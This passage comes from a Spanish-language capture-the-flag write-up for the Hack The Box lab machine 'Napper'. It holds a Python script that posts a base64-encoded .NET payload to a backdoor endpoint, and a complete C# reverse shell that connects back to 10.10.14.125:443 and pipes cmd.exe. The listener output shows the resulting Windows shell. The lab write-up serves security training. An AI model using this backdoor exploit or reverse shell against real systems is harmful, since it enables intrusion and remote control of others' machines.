+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>        }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>}</span></span></code></pre></div>
+<p>Y compilarlo con <code>mcs</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo apt install mono-complete
+</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ mcs -out:Test.exe Test.cs                                                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Test.cs(12,23): warning CS0219: The variable `reply&#39; is assigned but its value is never us
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>ed                                                                                        
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Compilation succeeded - 1 warning(s) 
+</span></span></code></pre></div>
+<p>Lo codificamos en base64</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ base64 Test.exe &gt; payload.txt
+</span></span></code></pre></div>
+<p>Nos copiamos el binario codificado en la clipboard.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ cat payload.txt | xclip -sel clip
+</span></span></code></pre></div>
+<p>Ejecutando el PoC del artículo anterior detectamos que el sitio web <code>https://napper.htb</code> tiene este backdoor pero no conseguimos ejecución de comandos.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#fff;font-weight:bold">import</span> requests
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span><span style="color:#fff;font-weight:bold">from</span> urllib3.exceptions <span style="color:#fff;font-weight:bold">import</span> InsecureRequestWarning
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>hosts = [<span style="color:#0ff;font-weight:bold">&#34;app.napper.htb&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;internal.napper.htb&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;napper.htb&#34;</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>payload = <span style="color:#0ff;font-weight:bold">&#34;TVqQAAMAAAAEAAAA[...]&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>form_field = <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;sdafwe3rwe23=</span><span style="color:#0ff;font-weight:bold">{</span>requests.utils.quote(payload)<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span><span style="color:#fff;font-weight:bold">for</span> h in hosts:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>    url_ssl = <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;https://</span><span style="color:#0ff;font-weight:bold">{</span>h<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">/ews/MsExgHealthCheckd/&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>    <span style="color:#fff;font-weight:bold">try</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>        r_ssl = requests.post(url_ssl, data=form_field, verify=<span style="color:#fff;font-weight:bold">False</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>        <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">{</span>url_ssl<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold"> : </span><span style="color:#0ff;font-weight:bold">{</span>r_ssl.status_code<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold"> </span><span style="color:#0ff;font-weight:bold">{</span>r_ssl.headers<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>    <span style="color:#fff;font-weight:bold">except</span> KeyboardInterrupt:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>        exit()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>    <span style="color:#fff;font-weight:bold">except</span> Exception <span style="color:#fff;font-weight:bold">as</span> e:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>        <span style="color:#fff;font-weight:bold">print</span>(e)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>        <span style="color:#fff;font-weight:bold">pass</span></span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ python3 poc.py 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>/home/pointedsec/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.19) or chardet (5.1.0)/charset_normalizer (2.0.12) doesn&#39;t match a supported version!
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>  warnings.warn(&#34;urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn&#39;t match a supported &#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>https://app.napper.htb/ews/MsExgHealthCheckd/ : 404 {&#39;Content-Type&#39;: &#39;text/html&#39;, &#39;Server&#39;: &#39;Microsoft-IIS/10.0&#39;, &#39;Date&#39;: &#39;Tue, 27 Aug 2024 13:25:45 GMT&#39;, &#39;Content-Length&#39;: &#39;1245&#39;}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>https://internal.napper.htb/ews/MsExgHealthCheckd/ : 401 {&#39;Content-Type&#39;: &#39;text/html&#39;, &#39;Server&#39;: &#39;Microsoft-IIS/10.0&#39;, &#39;WWW-Authenticate&#39;: &#39;Basic realm=&#34;internal.napper.htb&#34;&#39;, &#39;Date&#39;: &#39;Tue, 27 Aug 2024 13:25:45 GMT&#39;, &#39;Content-Length&#39;: &#39;1293&#39;}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>https://napper.htb/ews/MsExgHealthCheckd/ : 200 {&#39;Content-Length&#39;: &#39;0&#39;, &#39;Content-Type&#39;: &#39;text/html; charset=utf-8&#39;, &#39;Server&#39;: &#39;Microsoft-IIS/10.0 Microsoft-HTTPAPI/2.0&#39;, &#39;X-Powered-By&#39;: &#39;ASP.NET&#39;, &#39;Date&#39;: &#39;Tue, 27 Aug 2024 13:25:45 GMT&#39;}
+</span></span></code></pre></div>
+<p>Podemos ver que <code>napper.htb</code> devuelve un código 200 OK pero no recibimos ningún Ping.</p>
+<p>Después de prueba y error conseguí una consola con esta reverse shell en C#.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#fff;font-weight:bold">using</span> System;                                                                                                                                                                                                                                                                                                                
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span><span style="color:#fff;font-weight:bold">using</span> System.Text;                                                                                                                                                                                                                                                                                                           
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span><span style="color:#fff;font-weight:bold">using</span> System.IO;                                                                                                                                                                                                                                                                                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#fff;font-weight:bold">using</span> System.Diagnostics;                                                                                                                                                                                                                                                                                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#fff;font-weight:bold">using</span> System.ComponentModel;                                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span><span style="color:#fff;font-weight:bold">using</span> System.Linq;                                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span><span style="color:#fff;font-weight:bold">using</span> System.Net;                                                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span><span style="color:#fff;font-weight:bold">using</span> System.Net.Sockets;                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span><span style="color:#fff;font-weight:bold">namespace</span> Rev                                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>{                                                                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>        <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> Run                                                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>        {                                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>                <span style="color:#fff;font-weight:bold">static</span> StreamWriter streamWriter;                                                                                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>                <span style="color:#fff;font-weight:bold">public</span> Run()                                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>                {                                                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>                        using(TcpClient client = <span style="color:#fff;font-weight:bold">new</span> TcpClient(<span style="color:#0ff;font-weight:bold">&#34;10.10.14.125&#34;</span>, <span style="color:#ff0;font-weight:bold">443</span>))                                                                          
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>                        {                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>                                using(Stream stream = client.GetStream())                                                                                     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>                                {                                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>                                        using(StreamReader rdr = <span style="color:#fff;font-weight:bold">new</span> StreamReader(stream))                                                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>                                        {                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>                                                streamWriter = <span style="color:#fff;font-weight:bold">new</span> StreamWriter(stream);                                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>                                                StringBuilder strInput = <span style="color:#fff;font-weight:bold">new</span> StringBuilder();                                                                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>                                                Process p = <span style="color:#fff;font-weight:bold">new</span> Process();                                                                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>                                                p.StartInfo.FileName = <span style="color:#0ff;font-weight:bold">&#34;cmd.exe&#34;</span>;                                                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>                                                p.StartInfo.CreateNoWindow = <span style="color:#fff;font-weight:bold">true</span>;                                                                            
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>                                                p.StartInfo.UseShellExecute = <span style="color:#fff;font-weight:bold">false</span>;                                                                          
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>                                                p.StartInfo.RedirectStandardOutput = <span style="color:#fff;font-weight:bold">true</span>;                                                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>                                                p.StartInfo.RedirectStandardInput = <span style="color:#fff;font-weight:bold">true</span>;                                                                     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span>                                                p.StartInfo.RedirectStandardError = <span style="color:#fff;font-weight:bold">true</span>;                                                                     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>                                                p.OutputDataReceived += <span style="color:#fff;font-weight:bold">new</span> DataReceivedEventHandler(CmdOutputDataHandler);                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37</span><span>                                                p.Start();                                                                                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38</span><span>                                                p.BeginOutputReadLine();                                                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40</span><span>                                                <span style="color:#fff;font-weight:bold">while</span>(<span style="color:#fff;font-weight:bold">true</span>)                                                                                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41</span><span>                                                {                                                                                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42</span><span>                                                        strInput.Append(rdr.ReadLine());                                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43</span><span>                                                        <span style="color:#007f7f">//strInput.Append(&#34;\n&#34;);                                                                              </span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44</span><span>                                                        p.StandardInput.WriteLine(strInput);                                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45</span><span>                                                        strInput.Remove(<span style="color:#ff0;font-weight:bold">0</span>, strInput.Length);                                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46</span><span>                                                }                                                                                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47</span><span>                                        }                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48</span><span>                                }                                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49</span><span>                        }                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50</span><span>                }                                                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52</span><span>                <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> CmdOutputDataHandler(<span style="color:#fff;font-weight:bold">object</span> sendingProcess, DataReceivedEventArgs outLine)                                                
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53</span><span>        {                                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54</span><span>            StringBuilder strOutput = <span style="color:#fff;font-weight:bold">new</span> StringBuilder();                                                                                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">55</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">56</span><span>            <span style="color:#fff;font-weight:bold">if</span> (!String.IsNullOrEmpty(outLine.Data))                                                                                                          
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">57</span><span>            {                                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">58</span><span>                <span style="color:#fff;font-weight:bold">try</span>                                                            
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">59</span><span>                {                                                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">60</span><span>                    strOutput.Append(outLine.Data);                                                                                                           
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">61</span><span>                    streamWriter.WriteLine(strOutput);                                                                                                        
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">62</span><span>                    streamWriter.Flush();                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">63</span><span>                }                                                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">64</span><span>                <span style="color:#fff;font-weight:bold">catch</span> (Exception err) { }                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">65</span><span>            }                                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">66</span><span>        }                                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">67</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">68</span><span>        }                                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">69</span><span>}  </span></span></code></pre></div>
+<p>Compilando como librería.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ mcs -target:library -out:Rev.dll Rev.cs 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Test.cs(12,23): warning CS0219: The variable `reply&#39; is assigned but its value is never used
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Compilation succeeded - 1 warning(s)
+</span></span></code></pre></div>
+<p>Codificando el base64 y pegando el output al BurpSuite para hacer la solicitud.
+<strong>CTRL + U</strong> Para URL encodear.
+<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
+<p>Y conseguimos acceso.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ff0;font-weight:bold">443</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>listening on [any] 443 ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>connect to [10.10.14.125] from (UNKNOWN) [10.129.229.166] 57159
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Microsoft Windows [Version 10.0.19045.3636]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>(c) Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span><span style="color:#f00"></span>C:\Windows\system32&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>whoami
+</span></span></code></pre></div>
